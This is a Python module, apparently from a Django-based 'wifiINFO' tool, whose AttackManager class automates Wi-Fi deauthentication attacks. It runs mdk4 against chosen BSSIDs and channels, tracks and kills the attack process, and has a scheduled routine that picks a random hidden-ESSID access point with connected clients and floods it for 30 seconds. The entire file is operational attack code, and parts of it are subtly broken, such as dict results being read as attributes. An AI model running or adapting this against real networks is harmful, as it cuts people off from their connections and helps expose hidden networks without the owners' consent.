# -*- coding: utf-8 -*-
import importlib
import os
import signal
import sys
import time
import traceback
import subprocess
import random
import logging

from wifiINFO.models import Activelog
from wifiINFO.common import settings as configer

logger = logging.getLogger("wifiINFO.attack")
importlib.reload(sys)


class AttackManager(object):
    def __init__(self):
        self.config = configer.ConfigManager()
        self.ATKFACE = self.config.get('ATKFACE')

    def start_cron(self):
        self.config.set(ATK_STATUS=True)

    def stop_cron(self):
        self.config.set(ATK_STATUS=False)

    def deauth(self, bssid, channel):
        # Deauth
        try:
            process = subprocess.Popen([
                "mdk4",
                self.ATKFACE,
                "d",
                "-s",
                "20",
                "-c",
                str(channel),
                "-B",
                bssid
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=False)

            self.config.set(ATK_PID=process.pid, ATK_BSSID=bssid)
            return process
        except RuntimeError:
            return False

    def attack(self, bssid):
        try:
            target = Activelog.objects.get(bssid=bssid)
        except KeyError:
            return False

        if self.config.get('ATK_PID') is not None:
            return False

        pid = self.deauth(target.bssid, target.channel).pid
        return pid

    def kill(self):
        try:
            pid = self.config.get('ATK_PID')
            os.kill(pid, signal.SIGKILL)
            self.config.set(ATK_PID=None, ATK_BSSID=None)
            return True
        except ValueError:
            print('No pid found!')
            return False

    def cron_atk(self):
        if self.config.get('MAIN_STATUS') == "False":
            return False

        if self.config.get('ATK_STATUS') == "False":
            return False

        target = self.random_target()
        process = self.deauth(target.bssid, target.channel)
        time.sleep(30)

        try:
            process.kill()
            return True
        except RuntimeError:
            print('\n', '>>>' * 20)
            print(traceback.print_exc())
            print('\n', '>>>' * 20)
            print(traceback.format_exc())
            return False

    @staticmethod
    def random_target():
        try:
            no_essid_ap = Activelog.objects.filter(essid__isnull=True, client__isnull=False).values('bssid', 'channel')
            target = random.choice(no_essid_ap)

        except ConnectionError:
            print('\n', '>>>' * 20)
            print(traceback.print_exc())
            print('\n', '>>>' * 20)
            print(traceback.format_exc())
            return False
        return target
